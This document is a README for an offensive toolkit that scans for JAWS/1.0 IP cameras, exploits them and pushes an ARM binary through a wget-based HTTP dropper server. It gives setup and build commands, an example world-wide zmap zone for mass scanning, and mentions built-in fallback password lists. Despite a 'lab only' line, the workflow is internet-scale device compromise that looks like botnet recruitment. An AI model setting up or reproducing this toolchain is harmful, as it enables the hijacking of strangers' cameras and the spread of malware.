# armv7 — JAWS IP camera exploit chain

Exploits devices advertising **`Server: JAWS/1.0`**, delivers an ARM dropper, and pairs with a small HTTP callback server.

> **Lab / authorized targets only.**

## Files

| File | Role |
|------|------|
| `armv7.go` | Scanner/exploit driver (stdin IP list, TLS optional) |
| `drop.go` | Binary drop HTTP listener (default port **9**) |
| `run.sh` | Orchestrates scan + drop workflow in `screen` |
| `world.zone` | Example zmap input zone |
| `tutoriel.txt` | Setup notes (replace `0.0.0.0` with your server IP) |

## Setup

1. In `armv7.go` (~line 194) set your binary/NC server IP.
2. In `drop.go` set wget URL and ARMv7 binary name on your file server.
3. Host `drop.go` (or built binary) on the bin server.

```bash
go run drop.go    # listens on port 9
screen bash run.sh
```

Typical ports: **80**, **60001** (see `tutoriel.txt`).

## Build

```bash
go build -o armv7 armv7.go
go build -o drop drop.go
```

Pipe zmap/masscan output into the scanner binary on stdin.

## Notes

- Replace all placeholder IPs before any public repo push.
- `fallbackPasswords` and auth lists are in `armv7.go` for device classes that expose a login UI.
